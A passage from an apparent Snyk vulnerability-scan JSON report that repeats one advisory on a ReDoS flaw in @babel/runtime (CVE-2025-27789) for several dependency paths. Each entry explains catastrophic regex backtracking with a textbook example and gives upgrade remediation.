        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/system@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/system@5.13.2",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/system@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/system@5.13.2",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
